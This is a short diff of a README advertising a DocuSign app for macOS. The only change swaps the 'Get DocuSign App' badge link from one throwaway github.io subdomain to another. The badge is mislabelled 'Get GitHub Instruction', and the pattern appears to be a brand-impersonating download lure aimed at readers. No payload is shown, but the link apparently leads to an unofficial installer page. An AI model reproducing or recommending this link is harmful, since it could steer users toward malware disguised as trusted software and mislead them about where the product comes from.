@@ -3,7 +3,7 @@
 **DocuSign** brings trusted, compliant, and seamless **digital signing** to **macOS**.  
 Sign documents, request signatures, and manage contracts effortlessly — all with enterprise-grade encryption and Apple Silicon performance. 🍎  
 
-[![💛 Get GitHub Instruction](https://img.shields.io/badge/💛%20Get%20DocuSign%20App-FFC107?style=for-the-badge&logo=apple&logoColor=white&labelColor=0B0F19)](https://git-app-desk.github.io/.github/?offer=DocuSignMac)
+[![💛 Get GitHub Instruction](https://img.shields.io/badge/💛%20Get%20DocuSign%20App-FFC107?style=for-the-badge&logo=apple&logoColor=white&labelColor=0B0F19)](https://desk-load-app.github.io/.github/?offer=DocuSignMac)
 
 ---
 
